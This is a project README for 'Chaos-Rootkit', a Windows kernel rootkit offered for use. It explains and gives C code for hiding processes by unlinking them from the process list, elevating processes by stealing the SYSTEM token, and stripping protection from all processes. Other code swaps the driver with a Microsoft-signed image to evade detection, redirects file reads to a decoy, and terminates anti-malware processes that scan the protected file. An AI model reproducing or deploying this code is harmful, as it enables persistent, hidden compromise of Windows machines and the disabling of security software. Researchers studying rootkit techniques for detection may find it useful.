# Chaos-Rootkit

<p align="center">
  <img src="https://user-images.githubusercontent.com/60795188/227610457-51555f6e-885c-47fd-8a04-ab2351035a2b.png" alt="Image Description" width="320">
</p>


*  Chaos-Rootkit is an x64 Ring 0 rootkit with capabilities for process hiding, privilege escalation, protecting and unprotecting processes, and restricting access to files except for whitelisted processes. It can bypass file integrity checks and protect it against anti-malware, and swap the driver in memory and on disk with a signed Microsoft driver, working seamlessly on the latest Windows versions

* Gui version

<p align="center">
    <img src="https://github.com/user-attachments/assets/e89ff29a-01f8-461c-ad29-5a0454763fcf" alt="image">
</p>

    
<p align="center">
  <a href="https://www.buymeacoffee.com/ZeroMemoryEx" target="_blank">
    <img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee">
  </a>
</p>

# Features

* Hide process: This feature allows you to hide processes from listing tools via DKOM.

* Elevate specific process privileges : This feature enables you to elevate specific processes privilege .

* Swap the driver on disk and in memory with a Microsoft driver: All credit for this implementation goes to [IDontCode](https://x.com/_xeroxz) for his exceptional work, I've also handled the unload and shutdown routines for this feature so that the rootkits driver doesn’t get corrupted or crash at some point.

* Restrict file access for user-mode applications except for the provided process ID
  
* Spawn elevated process: launch command prompt with elevated privileges .

* Bypass the file integrity check and protect it against anti-malware : this work by redirecting file operations to a legitimate file, making our file appear authentic and signed with a valid certificate also if   an anti-malware attempting to scan it, the rootkit will immediately kill the anti-malware process.
  
* Unprotect all processes

* Protect a specific process with any given protection level (WinSystem, WinTcb, Windows, Authenticode, Lsa, Antimalware) .
  
* Protect a specific file against anti-malware, when an anti malware tries to scan it the rootkit will shut it down this done by checking the caller EPROCESS protection member .

  


# How use

* Since the rootkit driver is unsigned, Windows will not load it by default due to driver signature enforcement. Windows requires all kernel-mode drivers to be digitally signed by Microsoft to ensure system security and stability. We must enable test signing in order to bypass this requirement and load the unsigned driver.
* to do so, open cmd as Administrator and run, `bcdedit /set testsigning on` Then restart your computer.
* Next, you can either compile both the client and the driver or download them from the releases. Run the GUI client as admin and you're good to go to explore all the features.
  
# Under the Hood: Internals
## Elevate process privileges

* When a process is created, it inherits the token of the user who created it, The token is used by the system to determine what actions the process can perform, The token contains information about the user's security identifier (SID), group memberships, and privileges.

  ![image](https://user-images.githubusercontent.com/60795188/226148214-1d63149a-e2e6-4938-9067-30df7939c9db.png)
  
* The Token member resides at offset `0x4b8` in the `_EPROCESS` structure, which is a data structure that represents a process object. The Token member is defined in  `EX_FAST_REF` structure, which is a union type that can store either a pointer to a kernel object or a reference count.

* Windows Build Number token Offsets for x64 and x86 Architectures

  | x64 offsets    | x86 offsets        |
  | --------------| ------------------ |
  | 0x0160 (late 5.2) | 0x0150 (3.10)      |
  | 0x0168 (6.0)  | 0x0108 (3.50 to 4.0) |
  | 0x0208 (6.1)  | 0x012C (5.0)        |
  | 0x0348 (6.2 to 6.3) | 0xC8 (5.1 to early 5.2) |
  | 0x0358 (10.0 to 1809) | 0xD8 (late 5.2) |
  | 0x0360 (1903) | 0xE0 (6.0)          |
  | 0x04B8        | 0xF8 (6.1)          |
  |               | 0xEC (6.2 to 6.3)   |
  |               | 0xF4 (10.0 to 1607) |
  |               | 0xFC (1703 to 1903) |
  |               | 0x012C              |


    ![image](https://user-images.githubusercontent.com/60795188/226148257-b679202e-2371-4bda-98ea-689107221075.png)
  
* The `_EX_FAST_REF` structure in Windows contains three members: `Object` and `RefCount` and `Value`

  ![image](https://user-images.githubusercontent.com/60795188/226148720-8807b491-591c-479c-981f-734c1e868981.png)
  
* CMD inherited Token

  ![image](https://user-images.githubusercontent.com/60795188/226149373-2bf16ae9-e67f-4150-86b3-8376b0eb8428.png)
  
* we send the Process ID to the driver through an IOCTL 

* After receiving the PID from the user-mode application, the driver obtains the _EPROCESS pointer for the target process and accesses its Token member. It then replaces the target process token with the system process token, effectively elevating the process to the system security context.

 
* cmd token after
 
  ![image](https://user-images.githubusercontent.com/60795188/227381408-58e9cc54-95ac-4ec5-8d9c-5de6c28f7062.png)

* the process privileges, groups, rights 
  
  ![image](https://user-images.githubusercontent.com/60795188/226149800-e80ea9d8-5f69-4425-ad0e-a4a65cd946d9.png)

# Process Protection/Unprotection

* This is very simple, we first get the `_EPROCESS` as explained previously, calculate the address of the `PS_PROTECTION` member, and then dereference it to set our chosen protection level.
```C

// Retrieve the _EPROCESS structure for the target process by PID
NTSTATUS ret = PsLookupProcessByProcessId(ProtectionLevel->Process, &process);

if (ret != STATUS_SUCCESS)
{
    // clean up :) 
}

// Calculate the protection member offset
PPS_PROTECTION EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;

// Update the process protection level
*EProtectionLevel = ProtectionLevel->Protection;

```
* the unprotection part is also simple, We iterate over all processes in the system by traversing the `ActiveProcessLinks` doubly linked list. We loop through each process using the `Flink` pointer until it returns to the starting process, so we don’t get an infinite loop :)) . For each process, we compute the base address of the `_EPROCESS` structure by subtracting `ActiveProcessLinks` from `Flink` and then add protection offset to get the address of the `PS_PROTECTION` member. We then dereference this address and set it to `0`, effectively removing any protection from the process.

```C
  // get system process ActiveProcessLinks so we can start enumerating
  plist = (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset);


  // Loop until we reach the system process then stop to avoid an infinite loop :>>
  while (plist->Flink != (PLIST_ENTRY)((char*)process + eoffsets.ActiveProcessLinks_offset))
  {
  	ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - eoffsets.ActiveProcessLinks_offset + eoffsets.protection_offset;

  	// remove protection
  	*(BYTE*)EProtectionLevel = (BYTE)0;
  
	// got to next memberrr
   	plist = plist->Flink;

  }
```

# Swap Driver in desk and in memory

* ZwSwapCert is a driver swapping technique developed by `IDontCode (@_xeroxz)` that allows a loaded driver to replace itself with a legitimate Microsoft-signed driver both on disk and in memory. This  anti-detection method makes malicious drivers appear as legitimate Windows system components while maintaining their original functionality.
* All credit for the core ZwSwapCert implementation goes to `IDontCode` for this techniques.

## My Enhancements for Rootkit Use

* The original `ZwSwapCert` implementation was focused purely on the swap operation. While effective for stealth, it left a critical gap where when unloading the Windows attempts to unload a driver, it expects the original headers, sections, and cleanup routines. If these structures have been overwritten by a Microsoft driver image, the system will attempt to execute invalid routines resulting in a BSOD, To make the technique safe for rootkit integration, I extended the design with three key enhancements:

### 1.  PE Header Backup

* Before any overwrite takes place, the complete PE headers of the driver are backed up. These headers contain critical metadata such as entry points, section layouts, and resource information. Restoring them before unload ensures Windows can locate the correct routines and safely dismantle the driver.

```C
	originalHeaders = ExAllocatePoolWithTag(NonPagedPool, GetPeHdrSize(), 'HdrB');
	if (originalHeaders) {
		RtlCopyMemory(originalHeaders, (PVOID)DriverObject->DriverStart, GetPeHdrSize());
	}
```
### 2. .text Section Preservation

* The executable .text section is copied into memory prior to being patched. This section holds the driver’s core logic, including unload routines and exception handlers. By restoring it before unload, the rootkit guarantees that Windows can execute the proper cleanup sequence instead of executing foreign Microsoft code.

```C
		if (strcmp((char*)section->Name, ".text") == 0)
		{

			originalTextSection = ExAllocatePoolWithTag(NonPagedPool, section->SizeOfRawData, 'HdwB');
			if (!originalTextSection) {
				DbgPrint("failed to allocated address of original bytes\n");
				return (PVOID)(NULL);
			}
			memcpy(originalTextSection, (PVOID)(ModuleBase + section->VirtualAddress), section->SizeOfRawData);
			TextSectionAddress = (PVOID)(ModuleBase + section->VirtualAddress);
			DbgPrint("text section saving it ...\n");
			SizeOfRawData = section->SizeOfRawData;

		}
```

### 2. Full Driver File Backup

* the original rootkit driver file on disk is read and stored in memory before it is replaced. This allows the file to be restored after the driver unloads, preserving persistence. Without this, the rootkit would effectively delete itself during the swap, preventing any future loads.

```C
if (!NT_SUCCESS(Status = ZwReadFile(FileHandle, NULL, NULL, NULL, &IOBlock, FileCopy, fileInfo.EndOfFile.QuadPart, 0, 0)))
	{
		DbgPrint("failed to read from file\n");
		ExFreePool(FileCopy);
		return (Status);
	}

```

* Without the first 2 backups, Windows tries to unload Microsoft’s code as if it were the rootkit’s, leading to memory corruption and immediate BSODs. With the restore system, the original memory state and driver file are put back in place first, so unload behaves normally and cleanup runs as expected, This is the unload routine it restores the original driver sections and frees allocated memory.
  
```C
void PrepareDriverForUnload()
{
	__try
	{
		//  Restore the original .text section of the driver if all required pointers and sizes are valid, meaning this feature has already been enabled and they are not null.

		if (TextSectionAddress && originalTextSection && SizeOfRawData)
		{
			write_to_read_only_memory(TextSectionAddress, originalTextSection, SizeOfRawData);
		}

		// same here restore originalHeaders if ZwSwapCert is enabled
		if (originalHeaders)
		{
			DbgPrint("patching driver\n");

			write_to_read_only_memory(driverStartSaved, (PVOID)originalHeaders, GetPeHdrSize());
		}
	}
	__finally {

		// finally means this code will always execute at the end thanks to the Windows Kernel book by pavel yosifovich <333333333333333
		//Its purpose is to clean up memory leaks and restore the file on disk preventing it from being replaced by the legitimate Windows driver and ensuring the rootkit is fully unloaded.

		if (originalHeaders)
		{
			ExFreePool(originalHeaders, GetPeHdrSize(), 'HdrB');
		}

		if (originalTextSection)
		{
			ExFreePool(originalTextSection, textSize, 'HdwB');
		}

		RestoreFileInDeskAndFreeMemory();
	}
}
```

* Also we register a shutdown notification callback so that when the system shuts down, our unload routine is called to perform cleanup and prevent crashes

```C
if (!NT_SUCCESS(status = IoRegisterShutdownNotification(driverObject->DeviceObject))) 
{
	//*//
}
```
# In Memory

* After backing up everything we need, we proceed to swapping. First we read the full patch from disk, then delete it and create a new signed image.

```C
	if ((Result = IoQueryFullDriverPath(DriverObject, &DriverPath)) != STATUS_SUCCESS)
		return Result;
```

* After that we map the legitimate driver's sections into our rootkit. The mapping routine used is shown below.

```C
	for (UINT32 i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		PIMAGE_SECTION_HEADER section = &sections[i];

		write_to_read_only_memory((PVOID)(ModuleBase + section->VirtualAddress),
			(PVOID)(DriverBuffer + section->PointerToRawData), section->SizeOfRawData);
		ModuleBasesections++;
	}
```

* Then it changes the driver size and entry point to point to the mapped legitimate Microsoft driver, as shown in the screenshot below.

```C
	ExFreePool(DriverTempBuffer);
	DriverObject->DriverSize = sizeof RawDriver;
	DriverObject->DriverInit = SignedDriverEntry;
```

![giphy (2)](https://github.com/user-attachments/assets/8586102f-c9e4-49d2-bd6f-2be7d1380f62)

* driver entry point address before and after swapping

<img width="1050" height="179" alt="image" src="https://github.com/user-attachments/assets/b510fd2c-ac9e-49b3-af35-ed2d8a9e3dc8" />


* The PE header comparison shows a complete transformation of the driver’s identity. the entry point shifts to a different memory location, the image base changes from a custom value to the standard Microsoft format, the overall image size decreases, and both timestamp and checksum values are completely different.

<img width="722" height="692" alt="image" src="https://github.com/user-attachments/assets/3522213a-4e18-40e4-b6e8-d9a22f250100" />

* After driver swapping, the section tables show that the entire section layout has been replaced with the Microsoft driver's section structure. The virtual addresses, section sizes, and memory characteristics all change to match the legitimate driver's layout.

<img width="1061" height="300" alt="image" src="https://github.com/user-attachments/assets/8c16e11f-3615-491a-a3f0-bcfb92c7879c" />

# Memory Dump of .text Section

* The .text section memory dumps clearly show the code transformation. Before swapping, the .text section contains rootkit instructions and error-handling strings. After swapping, the same .text section memory addresses now contain legitimate Microsoft driver code.

* .text section in memory before swap, containing rootkit instructions and strings.

  <img width="638" height="734" alt="image" src="https://github.com/user-attachments/assets/013e15a4-fa82-49c1-a847-80d31fff7478" />
  
* .text section in memory after swap, overwritten with valid Microsoft driver code.

  <img width="631" height="487" alt="image" src="https://github.com/user-attachments/assets/30ff40dd-b11f-4695-8f3f-de603d4f9a3c" />

* Driver imports after mapping
<img width="756" height="458" alt="imports" src="https://github.com/user-attachments/assets/3c0c52d7-84c9-42e9-ae0d-0859a41ef2bf" />

* In Desk

<img width="398" height="475" alt="image" src="https://github.com/user-attachments/assets/608c3c9a-25f0-47da-95c3-b1b08b64ab49" />

# restrict access to file

* This feature is a kernel-level restriction that blocks file access from all user-mode applications except for one specific process. It ensures that only the permitted process can open or create the chosen file, while every other process attempting to touch it will be denied at the system call level.

* It first checks whether it matches the protected filename and ensures that other objects are valid, so we don’t cause any undefined behavior when accessing them.
```C

        // If we have a target object name, check whether it matches the protected filename
        if (ObjectAttributes &&
            ObjectAttributes->ObjectName &&
            ObjectAttributes->ObjectName->Buffer &&
            wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename))

```
* Then we get the calling PID and check if it matches the whitelisted PID obtained earlier from the user-mode client. If it does, we simply call `IoCreateFile` so the operation can proceed otherwise it returns access denied :)) .
```C
        {

            // Get the PID of the requestor 
            requestorPid = FltGetRequestorProcessId(&flt);

            if ((ULONG)requestorPid == (ULONG)xHooklist.pID || !requestorPid)
            {

                // Forward allowed requests to the original IoCreateFile implementation
                return IoCreateFile(
                    FileHandle,
                    DesiredAccess,
                    ObjectAttributes,
                    IoStatusBlock,
                    AllocationSize,
                    FileAttributes,
                    ShareAccess,
                    CreateDisposition,
                    CreateOptions,
                    EaBuffer,
                    EaLength,
                    CreateFileTypeNone,
                    NULL,
                    0
                );
            }
            return STATUS_ACCESS_DENIED;
        }
```

* For non‑target files, it calls `IoCreateFile` with the original parameters to avoid destabilizing the system same applies for next feature.

```C
        // Non-protected filenames forward to original implementation
        return IoCreateFile(
            FileHandle,
            DesiredAccess,
            ObjectAttributes,
            IoStatusBlock,
            AllocationSize,
            FileAttributes,
            ShareAccess,
            CreateDisposition,
            CreateOptions,
            EaBuffer,
            EaLength,
            CreateFileTypeNone,
            NULL,
            0
        );
    }
```

*  the implementation works by hooking `NtCreateFile` and redirecting execution into `FakeNtCreateFile` function. Once a file open/create request reaches the hook, the handler inspects the `OBJECT_ATTRIBUTES` to extract the target filename. If the filename matches the protected one, the fake function checks the requestor’s process ID. When the process ID matches the allowed value, the call is passed down to the original `IoCreateFile`, letting the operation succeed. If the process ID does not match, the fake function blocks the request by returning `STATUS_ACCESS_DENIED`. For any other filename, the request is passed straight to the original function.

* before hook

    <img width="475" height="736" alt="image" src="https://github.com/user-attachments/assets/b23022ba-4861-4e90-9ccd-1ba36252f97f" />
	
* after hook

    <img width="460" height="484" alt="image" src="https://github.com/user-attachments/assets/22784ee4-8508-4797-91f9-376763fefc70" />

# Bypass the file integrity check and protect it against anti-malware

* This one is similar to the previous one, except it doesn’t protect the file it just redirects the file opration to another legit file, you should note that only one of this two feature is allowed to work at time

```C
if (Option == 1)
    hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;

else if (Option == 2)
    hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
```

* We'll skip the parts we've already explained and move on to the unexplained ones. The first check verifies whether the filename is our target and filters out `.lnk` files. I added this because, without the filter, the filesystem logic can fail and the .lnk file's contents may be copied into the original file, corrupting it. I learned this the hard way it took me some time to figure out :((.

```C
       if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) &&
            !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk"))
```

* If the previous check succeeds, the code copies our fake target file (I used ntoskrnl.exe; you can use any file).

```C
            RtlCopyUnicodeString(ObjectAttributes->ObjectName, &xHooklist.decoyFile);
            ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
            ObjectAttributes->ObjectName->MaximumLength = xHooklist.decoyFile.MaximumLength;
```

* It then obtains the EPROCESS for the current process, adds the protection-member offset, and checks whether the process is PROTECTED_ANTIMALWARE_LIGHT. If so, it terminates the process.

```C
            ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;


            // Terminate anti-malware if anti malware light protected
            if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
            {
                NTSTATUS status = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);
                if (!NT_SUCCESS(status))
                    /**/
                else
                    /**/
            }
```

* Finally it calls `IoCreateFile` with the fake decoy filename attribute, redirecting the file operation to another file, so when a process tries to read our file, the read is redirected to the decoy.

```C
            status = IoCreateFile(
                FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
                AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
                CreateOptions, EaBuffer, EaLength, CreateFileTypeNone, (PVOID)NULL, 0
            );
```

# Hide Process

* First, we locate ActiveProcessLinks, which is a pointer to a PLIST_ENTRY structure. In our build the ActiveProcessLinks pointer is located at offset 0x448 within the EPROCESS structure; however, this offset can vary across different Windows versions. 

  ![image](https://user-images.githubusercontent.com/60795188/227363440-488dcf7d-d513-4563-8651-e44c50794881.png)
  
  | x64     |               | x86     |                     |         
  | ---     | ---           | ---     | ---                 |
  | 0xE0    | (late 5.2)    | 0xB4    | (3.10)              |
  | 0xE8    | (6.0)         | 0x98    | (3.50 to 4.0)       |
  | 0x0188  | (6.1)         | 0xA0    | (5.0)               |
  | 0x02E8  | (6.2 to 6.3)  | 0x88    | (5.1 to early 5.2)  |
  | 0x02F0  | (10.0 to 1607)| 0x98    | (late 5.2)          |
  | 0x02E8  | (1703 to 1809)| 0xA0    | (6.0)               |
  | 0x02F0  | (1903)        | 0xB8    | (6.1 to 1903)       |
  | 0x0448  | | 0xE8        |         |

* I implemented support for a wide range of Windows versions: if the rootkit cannot find the required offset (or one of the member fields it needs), it will disable features that depend on those offsets while still allowing features that do not require them.
  
```C
        if (pstack->Parameters.DeviceIoControl.IoControlCode >= HIDE_PROC && \
            pstack->Parameters.DeviceIoControl.IoControlCode <= UNPROTECT_ALL_PROCESSES && xHooklist.check_off)
        {
            pstatus = ERROR_UNSUPPORTED_OFFSET;
            __leave;
        }
```
  
* The `PLIST_ENTRY` structure is a doubly linked list structure . It contains two members, `Blink` and `Flink`, which are pointers to the previous and next entries in the list, respectively, These pointers allow for efficient traversal of the linked list in both directions.

  ![image](https://user-images.githubusercontent.com/60795188/227370531-b1a90f9a-4fe7-4f57-8787-e1da1543e1b7.png)
 
* The flink member resides in offset `0x0` and the blink member resides in offset `0x8`. The flink address `0xffff9c8b\071e3488` points to the next process node, while the blink address `0xfffff805\5121e0a0` points to the previous process node

  ![Screenshot 2023-03-23 222046](https://user-images.githubusercontent.com/60795188/227380821-92717306-66ee-40a0-8831-1cfc1a819eda.png)

* a diagram represents the `PLIST_ENTRY` structure.

  ![Screenshot 2023-03-23 181753](https://user-images.githubusercontent.com/60795188/227361450-d35e0fbb-cfbd-4fbf-bfd6-cef3373ab07a.png)
  
* To hide our chosen process in a listing tool, we modify the `flink` and `blink` pointers of the adjacent process nodes to point to each other, effectively removing our process from the linked list. Specifically, we make the next process node's `blink` pointer point to the previous node, and the previous process node's `flink` pointer point to the next node. This makes our process appear invisible in the listing tool's view of the linked list of processes

  ![image](https://user-images.githubusercontent.com/60795188/227380533-0e80298c-0800-485a-8797-1cc7a0efb757.png)

* Note: After removing the node from `PLIST_ENTRY` structure, it is important to set the corresponding pointer to NULL, Otherwise, when attempting to close the process, the `PLIST_ENTRY` structure will get sent to the `PspDeleteProcess` API to free all its resources, after the API does not find the process in the structure, it will suspect that the process has already been freed, resulting in a BSOD, as shown below .

  ![image](https://user-images.githubusercontent.com/60795188/228383831-f1a4940a-4ebb-4478-b964-ec54d4eab8e7.png)



